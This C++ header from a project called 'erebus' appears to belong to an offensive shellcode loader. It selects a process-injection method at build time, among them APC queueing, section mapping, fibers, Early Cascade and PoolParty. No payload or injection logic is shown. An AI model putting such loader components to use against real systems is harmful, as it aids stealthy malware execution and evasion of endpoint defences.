#ifndef EREBUS_INJECTION_DISPATCH_HPP
#define EREBUS_INJECTION_DISPATCH_HPP
#pragma once

#include "../loader.hpp"

namespace erebus {
	inline typeInjectionMethod GetInjectionMethod()
	{
	#if CONFIG_INJECTION_TYPE == 1
		return &InjectionNtQueueApcThread;
	#elif CONFIG_INJECTION_TYPE == 2
		return &InjectionNtMapViewOfSection;
	#elif CONFIG_INJECTION_TYPE == 3
		return &InjectionCreateFiber;
	#elif CONFIG_INJECTION_TYPE == 4
		return &InjectionEarlyCascade;
	#elif CONFIG_INJECTION_TYPE == 5
		return &InjectionPoolParty;
	#else
		return nullptr;
	#endif
	}
} // namespace erebus

#endif
